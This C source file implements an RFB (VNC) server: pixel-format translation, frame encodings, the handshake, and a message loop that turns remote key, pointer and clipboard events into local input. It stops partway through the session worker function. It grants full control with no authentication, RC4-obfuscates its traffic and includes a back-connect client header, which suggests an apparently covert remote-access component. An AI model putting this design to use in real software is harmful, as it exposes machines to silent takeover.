//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: rfb.c
// $Revision: 179 $
// $Date: 2014-04-04 22:00:05 +0400 (Пт, 04 апр 2014) $
// description:
//	Lightweight RFB (Remote FrameBuffer) 3.3 protocol implementation.

#include "main.h"
#include "rfb.h"
#include "translate.h"
#include "renc.h"
#include "zrle.h"
#include "hextile.h"

#include "backclientimpl.h"
#include "rc4impl.h"

// Worker threads support
LONG volatile g_RfbWorkerCount = 0;

#define	RFB_ENTER_WORKER()	_InterlockedIncrement(&g_RfbWorkerCount)
#define	RFB_LEAVE_WORKER()	_InterlockedDecrement(&g_RfbWorkerCount)

#define	RfbWaitForWorkers()	while(g_RfbWorkerCount){Sleep(100);}


// Pixel format used internally when the client is palette-based & server is truecolour
static const PIXEL_FORMAT BGR233Format = {
	8, 8, 0, 1, 7, 7, 3, 0, 3, 6
};

BOOL RfbSetTranslateFunction( PRFB_SESSION RfbSession )
{

	// By default, the actual format translated to matches the client format
	RfbSession->TranslatePixelFormat = RfbSession->PixelFormat;

	// Check that bits per pixel values are valid

	if ((RfbSession->TranslatePixelFormat.BitsPerPixel != 8) &&
		(RfbSession->TranslatePixelFormat.BitsPerPixel != 16) &&
		(RfbSession->TranslatePixelFormat.BitsPerPixel != 32))
	{
		return FALSE;
	}

	if ((RfbSession->LocalPixelFormat.BitsPerPixel != 8) &&
		(RfbSession->LocalPixelFormat.BitsPerPixel != 16) &&
		(RfbSession->LocalPixelFormat.BitsPerPixel != 32))
	{
		return FALSE;
	}

	if (!RfbSession->TranslatePixelFormat.TrueColourFlag && 
		(RfbSession->TranslatePixelFormat.BitsPerPixel != 8))
	{
		return FALSE;
	}
	if (!RfbSession->LocalPixelFormat.TrueColourFlag && 
		(RfbSession->LocalPixelFormat.BitsPerPixel != 8))
	{
		return FALSE;
	}

	// Now choose the translation function to use

	// We don't do remote palettes unless they're 8-bit
	if (!RfbSession->TranslatePixelFormat.TrueColourFlag)
	{
		// Is the local format the same?
		if (!RfbSession->LocalPixelFormat.TrueColourFlag &&
			(RfbSession->LocalPixelFormat.BitsPerPixel == 
			RfbSession->TranslatePixelFormat.BitsPerPixel))
		{
			// Yes, so don't do any encoding
			RfbSession->Transfunc = rfbTranslateNone;

			// The first time the client sends an update, it will call
			// GetRemotePalette to get the palette information required
			return TRUE;
		}
		else if (RfbSession->LocalPixelFormat.TrueColourFlag)
		{
			// Fill out the translation table as if writing to BGR233
			RfbSession->TranslatePixelFormat = BGR233Format;

			// Continue on down to the main translation section
		}
		else
		{
			// No, so not supported yet...
			return FALSE;
		}
	}

	// REMOTE FORMAT IS TRUE-COLOUR

	// Handle 8-bit palette-based local data
	if (!RfbSession->LocalPixelFormat.TrueColourFlag)
	{
		// 8-bit palette to truecolour...

		// Yes, so pick the right translation function!
		RfbSession->Transfunc = rfbTranslateWithSingleTableFns
			[RfbSession->LocalPixelFormat.BitsPerPixel / 16]
		[RfbSession->TranslatePixelFormat.BitsPerPixel / 16];

		(*rfbInitColourMapSingleTableFns[RfbSession->TranslatePixelFormat.BitsPerPixel / 16])(
			&RfbSession->Transtable, 
			&RfbSession->LocalPixelFormat, 
			&RfbSession->TranslatePixelFormat
			);
		return RfbSession->Transtable != NULL;
	}

	// If we reach here then we're doing truecolour to truecolour

	// Are the formats identical?
	if (PF_EQ(RfbSession->TranslatePixelFormat,RfbSession->LocalPixelFormat))
	{
		// Yes, so use the null translation function
		RfbSession->Transfunc = rfbTranslateNone;
		return TRUE;
	}

	// Is the local display a 16-bit one
	if (RfbSession->LocalPixelFormat.BitsPerPixel == 16)
	{
		// Yes, so use a single lookup-table
		RfbSession->Transfunc = rfbTranslateWithSingleTableFns
			[RfbSession->LocalPixelFormat.BitsPerPixel / 16]
		[RfbSession->TranslatePixelFormat.BitsPerPixel / 16];

		(*rfbInitTrueColourSingleTableFns[RfbSession->TranslatePixelFormat.BitsPerPixel / 16])(
			&RfbSession->Transtable, 
			&RfbSession->LocalPixelFormat, 
			&RfbSession->TranslatePixelFormat
			);
	}
	else
	{
		// No, so use three tables - one for each of R, G, B.
		RfbSession->Transfunc = rfbTranslateWithRGBTablesFns
			[RfbSession->LocalPixelFormat.BitsPerPixel / 16]
		[RfbSession->TranslatePixelFormat.BitsPerPixel / 16];

		(*rfbInitTrueColourRGBTablesFns[RfbSession->TranslatePixelFormat.BitsPerPixel / 16])(
			&RfbSession->Transtable, 
			&RfbSession->LocalPixelFormat, 
			&RfbSession->TranslatePixelFormat
			);
	}

	return (RfbSession->Transtable != NULL);
}

BOOL RfbGetRemotePalette(PRFB_SESSION RfbSession,RGBQUAD *quadlist, UINT ncolours)
{
	int i;
	// If the local server is palette-based then call SetTranslateFunction
	// to update the palette-to-truecolour mapping:
	if (!RfbSession->LocalPixelFormat.TrueColourFlag)
	{
		if (!RfbSetTranslateFunction(RfbSession)){
			return FALSE;
		}
	}

	// If the client is truecolour then don't fill in the palette buffer...
	if ( RfbSession->PixelFormat.TrueColourFlag ){
		return FALSE;
	}

	// If the server is truecolour then fake BGR233
	if ( RfbSession->LocalPixelFormat.TrueColourFlag )
	{
		// Fake BGR233...
		int ncolors = 1 << RfbSession->TranslatePixelFormat.BitsPerPixel;
		if (RfbSession->LocalPalette != NULL){
			hFree(RfbSession->LocalPalette);
		}
		RfbSession->LocalPalette = (char *)hAlloc(ncolors * sizeof(RGBQUAD));

		if (RfbSession->LocalPalette != NULL)
		{
			RGBQUAD *colour = (RGBQUAD *)RfbSession->LocalPalette;
			for ( i=0; i<ncolors; i++)
			{
				colour[i].rgbBlue = 
					(((i >> RfbSession->TranslatePixelFormat.BlueShift) & RfbSession->TranslatePixelFormat.BlueMax) * 255) / RfbSession->TranslatePixelFormat.BlueMax;
				colour[i].rgbRed = 
					(((i >> RfbSession->TranslatePixelFormat.RedShift) & RfbSession->TranslatePixelFormat.RedMax) * 255) / RfbSession->TranslatePixelFormat.RedMax;
				colour[i].rgbGreen = 
					(((i >> RfbSession->TranslatePixelFormat.GreenShift) & RfbSession->TranslatePixelFormat.GreenMax) * 255) / RfbSession->TranslatePixelFormat.GreenMax;
			}
		}
	}
	else
	{
		// Set up RGBQUAD rfbPixelFormat info
		PIXEL_FORMAT remote;
		remote.TrueColourFlag = TRUE;
		remote.BitsPerPixel = 32;
		remote.Depth = 24;
		remote.BigEndianFlag = FALSE;
		remote.RedMax = remote.GreenMax = remote.BlueMax = 255;
		remote.RedShift = 16;
		remote.GreenShift = 8;
		remote.BlueShift = 0;

		// We get the ColourMapSingleTableFns procedure to handle retrieval of the
		// palette for us, to avoid replicating the code!
		(*rfbInitColourMapSingleTableFns[remote.BitsPerPixel / 16])
			(&RfbSession->LocalPalette, &RfbSession->LocalPixelFormat, &remote);
	}

	// Did we create some palette info?
	if (RfbSession->LocalPalette == NULL)
	{
		DbgPrint("failed to obtain colour map data!\n");
		return FALSE;
	}

	// Copy the data into the RGBQUAD buffer
	memcpy(quadlist, RfbSession->LocalPalette, ncolours*sizeof(RGBQUAD));

	return TRUE;
}

// initializes pixel tables and translate tables
VOID RfbSetLocalPixelFormat( PRFB_SESSION RfbSession, PPIXEL_FORMAT PixelFormat )
{
	RfbSession->LocalPixelFormat = 
		RfbSession->PixelFormat = 
		RfbSession->TranslatePixelFormat = *PixelFormat;

	RfbSetTranslateFunction(RfbSession);
}

// updates the remote pixel format and translation tables
VOID RfbSetRemotePixelFormat( PRFB_SESSION RfbSession, PPIXEL_FORMAT PixelFormat )
{
	RfbSession->PixelFormat = *PixelFormat;
	RfbSetTranslateFunction(RfbSession);

	// send pallete update to the client
	RfbSendPalette(RfbSession);
}

VOID RfbSetEncodingsFn(
	IN PRFB_SESSION RfbSession,
	IN USHORT NumberOfEncodings,
	IN CARD32 *Encodings
	)
{
	int i, lastPreferredEncoding = -1;

	if ( RfbSession->preferredEncoding != -1 ){
		lastPreferredEncoding = RfbSession->preferredEncoding;
	}

	/* Reset all flags to defaults (allows us to switch between PointerPos and Server Drawn Cursors) */
	RfbSession->preferredEncoding=-1;
	RfbSession->UseCopyRect = FALSE;
	RfbSession->enableLastRectEncoding = FALSE;
	
	for (i = 0; i < NumberOfEncodings; i++) {
		CARD32 Enc = Swap32IfLE(Encodings[i]);
		switch (Enc ) 
		{
		case RfbEncodingCopyRect:
			RfbSession->UseCopyRect = TRUE;
			break;
		case RfbEncodingRAW:
//		case RfbEncodingRRE:
//		case RfbEncodingCoRRE:
		case RfbEncodingHextile:
//		case RfbEncodingUltraZip:
//		case RfbEncodingZlib:
		case RfbEncodingZRLE:
		case RfbEncodingZYWRLE:
//		case RfbEncodingTight:
			/* The first supported encoding is the 'preferred' encoding */
			if (RfbSession->preferredEncoding == -1)
				RfbSession->preferredEncoding = Enc;
			break;
		case RfbEncodingLastRect:
			if (!RfbSession->enableLastRectEncoding) {
				RfbSession->enableLastRectEncoding = TRUE;
			}
			break;
		default:
			if ( Enc >= (CARD32)RfbEncodingCompressLevel0 &&
				Enc <= (CARD32)RfbEncodingCompressLevel9 ) {
					RfbSession->zlibCompressLevel = Enc & 0x0F;
					RfbSession->tightCompressLevel = Enc & 0x0F;

			} else if ( Enc >= (CARD32)RfbEncodingQualityLevel0 &&
				Enc <= (CARD32)RfbEncodingQualityLevel9 ) {
					RfbSession->tightQualityLevel = Enc & 0x0F;
			}
			break;
		}
	}

	if (RfbSession->preferredEncoding == -1) {
		if (lastPreferredEncoding==-1) {
			RfbSession->preferredEncoding = RfbEncodingRAW;
		}
		else {
			RfbSession->preferredEncoding = lastPreferredEncoding;
		}
	}
	//update translate functions
	RfbSetTranslateFunction(RfbSession);
}

WINERROR RfbClearPendingQueue(PRFB_SESSION Session)
{
	WINERROR	Status = NO_ERROR;
	LONG		bSize, bTotal = 0;
	CHAR		Buffer[0x80];

	while (!ioctlsocket(Session->sSocket, FIONREAD, &bTotal) && (bTotal > 0))
	{
		do
		{
			if ((bSize = recv(Session->sSocket, Buffer, min(bTotal, 0x80), 0)) > 0)
			{
				rc4(Buffer, bSize, &Session->rc4in);
				bTotal -= bSize;
			}
			else
				break;
		} while(bTotal > 0);
		bTotal = 0;
	}	// while (!_ioctlsocket(Socket, FIONREAD, &bTotal) && (bTotal > 0))

	return(Status);
}

WINERROR RfbReadData(PRFB_SESSION Session, PCHAR Buffer, LONG bSize)
{
	WINERROR Status = NO_ERROR;
	LONG bRead;

	ASSERT(bSize);

	do
	{
		bRead = recv(Session->sSocket, Buffer, bSize, 0);
		if (bRead == 0)
		{
			Status = ERROR_CONNECTION_ABORTED;
			break;
		}

		if (bRead == SOCKET_ERROR)
		{
			Status = GetLastError();
			break;
		}

		rc4(Buffer, bRead, &Session->rc4in);

		bSize -= bRead;
		Buffer += bRead;
	} while (bSize);

	return (Status);
}

INT RfbSendData(PRFB_SESSION Session, PCHAR Buffer, LONG bSize)
{
	int bSent, bTotal = 0;
	int bRemain = bSize;
	fd_set w = { 0 };
	
	PCHAR Encrypted = AppAlloc(bSize);
	if (!Encrypted)
		return bTotal;

	memcpy(Encrypted, Buffer, bSize);
	rc4(Encrypted, bSize, &Session->rc4out);

	do 
	{
		FD_ZERO(&w);
		FD_SET(Session->sSocket, &w);

		if (select(-1, NULL, &w, NULL, NULL) == SOCKET_ERROR)
			break;

		bSent = send(Session->sSocket, Encrypted + bTotal, bSize - bTotal, 0);
		if (bSent == SOCKET_ERROR)
			break;

		bTotal += bSent;
	} while (bTotal < bSize);

	AppFree(Encrypted);
	return bTotal;
}

/*
 * Send the contents of cl->updateBuf.  Returns 1 if successful, -1 if
 * not (errno should be set).
 */

BOOL RfbSendUpdateBuf(PRFB_SESSION RfbSession)
{
	BOOL Result = TRUE;
	if (RfbSession->UpdateBufLen)
		Result = (RfbSendData(RfbSession, RfbSession->UpdateBuf, RfbSession->UpdateBufLen) == RfbSession->UpdateBufLen);
	RfbSession->UpdateBufLen = 0;
	return Result;
}

WINERROR RfbReadMessage(PRFB_SESSION RfbSession, UCHAR MessageType, ULONG MessageSize, PCHAR* pMessageBody)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PCHAR	MessageBody;

	ASSERT(MessageSize > sizeof(UCHAR));

	if (MessageBody = hAlloc(MessageSize))
	{
		MessageBody[0] = MessageType;
		if ((Status = RfbReadData(RfbSession, MessageBody + sizeof(UCHAR), MessageSize - sizeof(UCHAR))) == NO_ERROR)
			*pMessageBody = MessageBody;
		else
			hFree(MessageBody);					
	}	// if (MessageBody = hAlloc(MessageSize))

	return(Status);
}


WINERROR RfbAppendMessage(PRFB_SESSION Session, ULONG MessageSize, ULONG AppendSize, PCHAR MessageBody, PCHAR* pAppended)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PCHAR	Appended;

	if (Appended = hAlloc(MessageSize + AppendSize))
	{
		if ((Status = RfbReadData(Session, Appended + MessageSize, AppendSize)) == NO_ERROR)
		{
			memcpy(Appended, MessageBody, MessageSize);
			*pAppended = Appended;
		}
		else
			hFree(Appended);
	}	// if (MessageData = hAlloc(MessageSize + DataSize))

	return(Status);
}


/*
 * rfbSendFramebufferUpdate - send the currently pending framebuffer update to
 * the RFB client.
 */

BOOL RfbSendFramebufferUpdate(PRFB_SESSION RfbSession,int nRects,LPRECT pRectangles)
{
	PRFB_MSG_FRAMEBUFFER_UPDATE FbUpdate = (PRFB_MSG_FRAMEBUFFER_UPDATE)RfbSession->UpdateBuf;
	BOOL Result = TRUE;
	int i;

	// lock sending queue
	EnterCriticalSection( &RfbSession->SendLock );

	FbUpdate->MessageType = RfbFramebufferUpdate;
	FbUpdate->NumberOfRectangles = Swap16IfLE(nRects);
	RfbSession->UpdateBufLen = sz_rfbFramebufferUpdateMsg;
	
	for ( i = 0; (i < nRects) && Result; i++ )
	{
		switch( RfbSession->preferredEncoding )
		{
		case -1:
		case RfbEncodingRAW:
			if (!RfbSendRectEncodingRaw(RfbSession, &pRectangles[i]))
				Result = FALSE;
			break;
		case RfbEncodingHextile:
			if (!RfbSendRectEncodingHextile(RfbSession, &pRectangles[i]))
				Result = FALSE;
			break;
		case RfbEncodingZRLE:
		case RfbEncodingZYWRLE:
			if (!RfbSendRectEncodingZRLE(RfbSession, &pRectangles[i]))
				Result = FALSE;
			break;
		default:
			ASSERT(FALSE);
			break;
		}
	}

	if ( Result ){
		// send all the remaining data
		Result = RfbSendUpdateBuf(RfbSession);
	}else{
		// skip all the data
		RfbSession->UpdateBufLen = 0;
	}

	// unlock ending queue
	LeaveCriticalSection( &RfbSession->SendLock );
	return Result;
}

// sends server clipboard to the client
WINERROR RfbSendServerText(PRFB_SESSION RfbSession, char *Text, LONG Length)
{
	WINERROR Status = NO_ERROR;
	RFB_MSG_SERVER_CUT_TEXT	SrvText = {0};
	ULONG	bSize;

	if ( Text == NULL )
	{
		Length = 0;
	}

	SrvText.MessageType = RfbServerCutText;
	SrvText.Length = Swap32IfLE(Length);

	EnterCriticalSection( &RfbSession->SendLock );

	bSize = RfbSendData(RfbSession, (PCHAR)&SrvText, sizeof(RFB_MSG_SERVER_CUT_TEXT));
	if (bSize == sizeof(RFB_MSG_SERVER_CUT_TEXT))
	{
		if ( Length )
		{
			bSize = RfbSendData(RfbSession, Text, Length);
			if (bSize != Length )
			{
				Status = GetLastError();
			}
		}
	}else{
		Status = GetLastError();
	}

	LeaveCriticalSection( &RfbSession->SendLock );

	return(Status);
}

// send the local server palette to the client
BOOL RfbSendPalette(PRFB_SESSION RfbSession)
{
	RFB_MSG_SET_COLOUR_MAP_ENTRIES setcmap;
	RGBQUAD *rgbquad = NULL;
	UINT ncolours = 256;
	UINT i;
	BOOL fbResult = TRUE;

	EnterCriticalSection( &RfbSession->SendLock );

	do 
	{
		// Reserve space for the colour data
		rgbquad = (RGBQUAD*)hAlloc(ncolours*sizeof(RGBQUAD));
		if (rgbquad == NULL){
			fbResult = TRUE;
			break;
		}

		// Get the data
		if (!RfbGetRemotePalette(RfbSession,rgbquad, ncolours))
		{
			fbResult = TRUE;
			break;
		}

		// Compose the message
		setcmap.type = RfbSetColourMapEntries;
		setcmap.firstColour = Swap16IfLE(0);
		setcmap.nColours = Swap16IfLE(ncolours);

		if (sz_rfbSetColourMapEntriesMsg != RfbSendData(RfbSession, (PCHAR)&setcmap, sz_rfbSetColourMapEntriesMsg))
		{
			fbResult = FALSE;
			break;
		}

		// Now send the actual colour data...
		for ( i=0; i<ncolours; i++)
		{
			struct _PIXELDATA {
				CARD16 r, g, b;
			} pixeldata;

			pixeldata.r = Swap16IfLE(((CARD16)rgbquad[i].rgbRed) << 8);
			pixeldata.g = Swap16IfLE(((CARD16)rgbquad[i].rgbGreen) << 8);
			pixeldata.b = Swap16IfLE(((CARD16)rgbquad[i].rgbBlue) << 8);

			if (sizeof(pixeldata) != RfbSendData(RfbSession, (PCHAR)&pixeldata, sizeof(pixeldata)))
			{
				fbResult = FALSE;
				break;
			}
		}
	}while( FALSE );

	LeaveCriticalSection( &RfbSession->SendLock );

	// Delete the rgbquad data
	if ( rgbquad ){
		hFree(rgbquad);
	}
//	RfbClearPendingQueue(RfbSession->sSocket);
	return fbResult;
}


//
//	RFB protocol main message loop.
//
WINERROR RfbMessageLoop(PRFB_SESSION RfbSession)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	ULONG	DataSize, MessageSize;
	UCHAR	MessageType;
	PCHAR	MessageBody = NULL;

	do 
	{
		if (NO_ERROR != (Status = RfbReadData(RfbSession, (PCHAR)&MessageType, sizeof(UCHAR))))
		{
			DbgPrint("RfbReadData FAIL %d", Status);
			break;
		}
			
		switch(MessageType)
		{
		case RfbSetPixelFormat:
			DbgPrint("RfbSetPixelFormat");
			MessageSize = sizeof(RFB_MSG_SET_PIXEL_FORMAT);
			if ((Status = RfbReadMessage(RfbSession, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			{
				PRFB_MSG_SET_PIXEL_FORMAT MsgPixelFormat = (PRFB_MSG_SET_PIXEL_FORMAT)MessageBody;

				// Swap the relevant bits.
				MsgPixelFormat->PixelFormat.RedMax = Swap16IfLE(MsgPixelFormat->PixelFormat.RedMax);
				MsgPixelFormat->PixelFormat.GreenMax = Swap16IfLE(MsgPixelFormat->PixelFormat.GreenMax);
				MsgPixelFormat->PixelFormat.BlueMax = Swap16IfLE(MsgPixelFormat->PixelFormat.BlueMax);

				// update remote pixel translation
				RfbSetRemotePixelFormat(RfbSession,&MsgPixelFormat->PixelFormat);
				
				// notify server
				VncSetPixelFormat(RfbSession->VncSession, &MsgPixelFormat->PixelFormat);
			}
			break;
//		case RfbFixColourMapEntries:
//			MessageSize = sizeof(RFB_MSG_FIX_COLOUR_MAP_ENTRIES);
//			break;
		case RfbSetEncodings:
			DbgPrint("RfbSetEncodings");
			MessageSize = sizeof(RFB_MSG_SET_ENCODINGS);
			if ((Status = RfbReadMessage(RfbSession, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			{
				PRFB_MSG_SET_ENCODINGS pMessage = (PRFB_MSG_SET_ENCODINGS)MessageBody;
				CARD32 *Encodings;
				USHORT NumberOfEncodings;
				ASSERT(pMessage->MessageType == RfbSetEncodings);
				ASSERT(Swap16IfLE(pMessage->NumberOfEncodings) > 0);

				// fix encodings number
				NumberOfEncodings = Swap16IfLE(pMessage->NumberOfEncodings);

				if (DataSize = NumberOfEncodings * sizeof(RFB_ENCODING))
				{					
					if (Encodings = (CARD32*)hAlloc(DataSize))
					{
						if ((Status = RfbReadData(RfbSession, (PCHAR)Encodings, DataSize)) == NO_ERROR)
						{
							RfbSetEncodingsFn(RfbSession,NumberOfEncodings,Encodings);
						}
						hFree(Encodings);
					}	// if (MessageData = Alloc(MessageSize + DataSize))
				}	// if (pMessage->NumberOfEncodings > 1)
			}	// if ((Status = RfbReadMessage(RfbSession->sSocket, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			break;
		case RfbFramebufferUpdateRequest:
			DbgPrint("RfbFramebufferUpdateRequest");
			MessageSize = sizeof(RFB_MSG_FRAMEBUFFER_UPDATE_REQUEST);
			if ((Status = RfbReadMessage(RfbSession, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			{
				PRFB_MSG_FRAMEBUFFER_UPDATE_REQUEST FbRequest = (PRFB_MSG_FRAMEBUFFER_UPDATE_REQUEST)MessageBody;
				VNC_FRAMEBUFFER_REQUEST VncFbRequest;
								
				ASSERT(FbRequest->MessageType == RfbFramebufferUpdateRequest);

				VncFbRequest.Incremental = (BOOL)FbRequest->Incremental;

				VncFbRequest.Rect.left = (LONG)Swap16IfLE(FbRequest->XPosition);
				VncFbRequest.Rect.right = VncFbRequest.Rect.left + (LONG)Swap16IfLE(FbRequest->Width);
				VncFbRequest.Rect.bottom = (LONG)(RfbSession->VncSession->Desktop.dwHeight - Swap16IfLE(FbRequest->YPosition));
				VncFbRequest.Rect.top = VncFbRequest.Rect.bottom - (LONG)Swap16IfLE(FbRequest->Height);

				VncGetFramebuffer(RfbSession->VncSession, &VncFbRequest);
					
			}	// if ((Status = RfbReadMessage(RfbSession->sSocket, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			break;
		case RfbKeyEvent:
			DbgPrint("RfbKeyEvent");
			MessageSize = sizeof(RFB_MSG_KEY_EVENT);
			if ((Status = RfbReadMessage(RfbSession, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			{
				PRFB_MSG_KEY_EVENT	KeyEvent = (PRFB_MSG_KEY_EVENT)MessageBody;
				VNC_KEY_EVENT	VncKeyEvent;

				ASSERT(KeyEvent->MessageType == RfbKeyEvent);

				VncKeyEvent.DownFlag = (BOOL)KeyEvent->DownFlag;
				VncKeyEvent.Key = Swap32IfLE(KeyEvent->Key);

				VncOnKeyEvent(RfbSession->VncSession, &VncKeyEvent);
			}	// if ((Status = RfbReadMessage(RfbSession->sSocket, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			break;
		case RfbPointerEvent:
			DbgPrint("RfbPointerEvent");
			MessageSize = sizeof(RFB_MSG_POINTER_EVENT);
			if ((Status = RfbReadMessage(RfbSession, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			{
				PRFB_MSG_POINTER_EVENT PointerEvent = (PRFB_MSG_POINTER_EVENT)MessageBody;
				VNC_POINTER_EVENT VncPointerEvent;

				ASSERT(PointerEvent->MessageType == RfbPointerEvent);
		
				VncPointerEvent.ButtonMask = (ULONG)PointerEvent->ButtonMask;
				VncPointerEvent.XPosition = Swap16IfLE(PointerEvent->XPosition);
				VncPointerEvent.YPosition = Swap16IfLE(PointerEvent->YPosition);

				VncOnPointerEvent(RfbSession->VncSession, &VncPointerEvent);
			}	// if ((Status = RfbReadMessage(RfbSession->sSocket, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			break;
		case RfbClientCutText:
			DbgPrint("RfbClientCutText");
			MessageSize = sizeof(RFB_MSG_CLIENT_CUT_TEXT);
			if ((Status = RfbReadMessage(RfbSession, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			{
				PRFB_MSG_CLIENT_CUT_TEXT ClientCutText = (PRFB_MSG_CLIENT_CUT_TEXT)MessageBody;
				
				ASSERT(ClientCutText->MessageType == RfbClientCutText);
				if (DataSize = Swap32IfLE(ClientCutText->Length) * sizeof(CHAR))
				{
					PVNC_CLIENT_CUT_TEXT pVncCutText;
					if (pVncCutText = hAlloc(sizeof(VNC_CLIENT_CUT_TEXT) + DataSize))
					{
						if ((Status = RfbReadData(RfbSession, (PCHAR)&pVncCutText->Text, DataSize)) == NO_ERROR)
						{
							pVncCutText->Length = Swap32IfLE(ClientCutText->Length);
							VncOnClientCutText(RfbSession->VncSession, pVncCutText);
						}
						hFree(pVncCutText);
					}	// if (pVncCutText = hAlloc(sizeof(VNC_CLIENT_CUT_TEXT) + DataSize))
				}	// if (DataSize = htonl(ClientCutText->Length) * sizeof(CHAR))
			}	// if ((Status = RfbReadMessage(RfbSession->sSocket, MessageType, MessageSize, &MessageBody)) == NO_ERROR)
			break;
		default:
			{
				//ASSERT(FALSE);
				DbgPrint("VNC: Unknown message: %i\n",MessageType);
			}
			break;
		}	// switch(MessageType)

		if (MessageBody)
		{
			hFree(MessageBody);
			MessageBody = NULL;
		}
	} while(TRUE);

	return(Status);
}

//
//	Performs RFB protocol handshake and initializes RFB message session.
//
static WINERROR RfbInitSession(PRFB_SESSION RfbSession)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	RFB_AUTHENTICATION_V38	RfbAuth;
	RFB_CLIENT_AUTH_V38 ClientAuth;
	RFB_CLIENT_INIT		ClientInit;
	RFB_SECURITY_RESULT_V38 SecurityResult;
	LONG	bSize = 0, bTotal = 0;
	PRFB_SERVER	pServer = RfbSession->pServer;
	CHAR szClientVersion[sizeof(szRfbVersion)];

	ASSERT_RFB_SESSION(RfbSession);

	do	// not a loop 
	{
		// send RFB version
		if (cstrlen(szRfbVersion) != RfbSendData(RfbSession, szRfbVersion, cstrlen(szRfbVersion)))
		{
			DbgPrint("szRfbVersion FAIL");
			Status = ERROR_INVALID_PARAMETER;
			break;
		}

		// recv rfb VERSION from client
		if (NO_ERROR != (Status = RfbReadData(RfbSession, (PCHAR)szClientVersion, sizeof(szClientVersion) - 1)))
		{
			DbgPrint("szClientVersion FAIL");
			break;
		}
		
		// check the protocol version
		szClientVersion[sizeof(szClientVersion) - 1] = 0;
		if (_stricmp(szClientVersion, szRfbVersion) != 0)
		{
			DbgPrint("szClientVersion size FAIL");
			Status = ERROR_INVALID_PARAMETER;
			break;
		}

		// clear queue
		RfbClearPendingQueue(RfbSession);

		// Sending RFB autentication message

		// No authentication required
		RfbAuth.AuthNum = 1;
		RfbAuth.AuthType = RFB_AUTH_NONE;

		// the server and client must agree on the
		// type of security to be used on the connection.
		if (sizeof(RFB_AUTHENTICATION_V38) != RfbSendData(RfbSession, (PCHAR)&RfbAuth, sizeof(RFB_AUTHENTICATION_V38)))
		{
			DbgPrint("RFB_AUTHENTICATION_V38 FAIL");
			break;
		}

		// If the server listed at least one valid security type supported by the client, the
		// client sends back a single byte indicating which security type is to be used on
		// the connection
		if (NO_ERROR != (Status = RfbReadData(RfbSession, (PCHAR)&ClientAuth, sizeof(RFB_CLIENT_AUTH_V38))))
		{
			DbgPrint("RFB_CLIENT_AUTH_V38 FAIL");
			break;
		}

		//if client provided invalid auth type, we just close the connection
		if (ClientAuth.AuthType != RFB_AUTH_NONE)
		{
			DbgPrint("RFB_AUTH_NONE FAIL");
			Status = ERROR_INVALID_PARAMETER;
			break;
		}

		// The server sends a word to inform the client whether the security handshaking was successful.
		SecurityResult.Result = RFB_SECURITY_OK;
		if (sizeof(RFB_SECURITY_RESULT_V38) != RfbSendData(RfbSession, (PCHAR)&SecurityResult, sizeof(RFB_SECURITY_RESULT_V38)))
		{
			DbgPrint("RFB_SECURITY_RESULT_V38 FAIL");
			break;
		}

		// Once the client and server are sure that they're happy to talk to one another using the
		// agreed security type, the protocol passes to the initialization phase. The client sends a
		// ClientInit message followed by the server sending a ServerInit message.

		// Waiting until client init message received
		do
		{
			Sleep(500);
			if (ioctlsocket(RfbSession->sSocket, FIONREAD, &bSize))
				break;
		} while((bSize < sizeof(RFB_CLIENT_INIT)) && WaitForSingleObject(pServer->hShutdownEvent, 0) == WAIT_TIMEOUT);
		
		if (bSize >= sizeof(RFB_CLIENT_INIT))
			Status = RfbReadData(RfbSession, (PCHAR)&ClientInit, sizeof(RFB_CLIENT_INIT));

		if (NO_ERROR != Status)
			Status = ERROR_INVALID_PARAMETER;
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return(Status);
}

//
//	Thread function.
//	RFB session worker thread. Processes RFB-protocol messages. Sends FrameBuffer data. 
//
static WINERROR WINAPI RfbSessionWorker(PRFB_SESSION RfbSession)
{	
	WINERROR Status = ERROR_UNSUCCESSFULL;
	PRFB_SERVER_INIT	pServerInit;
	LONG	bSize = 0, bTotal = 0;
	PRFB_SERVER	pServer = RfbSession->pServer;
	PIXEL_FORMAT PixelFormat;

	RFB_ENTER_WORKER();

	ASSERT_RFB_SESSION(RfbSession);

	do	// not a loop 
	{
		// Creating VNC session.
		if ((Status = VncCreateSession(RfbSession,&RfbSession->VncSession,&PixelFormat)) != NO_ERROR)
			break;

		// update local pixel format
		RfbSetLocalPixelFormat(RfbSession,&PixelFormat);

		// Creating and filling RFB_SERVER_INIT message
		bSize = (sizeof(RFB_SERVER_INIT) + RfbSession->VncSession->Desktop.NameLength);
		if (!(pServerInit = hAlloc(bSize)))
			break;

		pServerInit->FramebufferHeight = 
			Swap16IfLE((USHORT)RfbSession->VncSession->Desktop.dwHeight);
		pServerInit->FramebufferWidth = 
			Swap16IfLE((USHORT)RfbSession->VncSession->Desktop.dwWidth);
		if (pServerInit->NameLength = Swap32IfLE(RfbSession->VncSession->Desktop.NameLength)){
			memcpy(
				&pServerInit->Name, 
				&RfbSession->VncSession->Desktop.Name, 
				RfbSession->VncSession->Desktop.NameLength
				);
		}
		memcpy(&pServerInit->ServerPixelFormat, &RfbSession->LocalPixelFormat, sizeof(PIXEL_FORMAT));

		//swap bytes
		pServerInit->ServerPixelFormat.RedMax = Swap16IfLE(pServerInit->ServerPixelFormat.RedMax);
		pServerInit->ServerPixelFormat.GreenMax = Swap16IfLE(pServerInit->ServerPixelFormat.GreenMax);
		pServerInit->ServerPixelFormat.BlueMax = Swap16IfLE(pServerInit->ServerPixelFormat.BlueMax);

		RfbClearPendingQueue(RfbSession);

		// Sending RFB_SERVER_INIT message
		if (bSize != RfbSendData(RfbSession, (PCHAR)pServerInit, bSize))
			break;
		
		// Entering message loop
		Status = RfbMessageLoop(RfbSession);
		
	} while(FALSE);

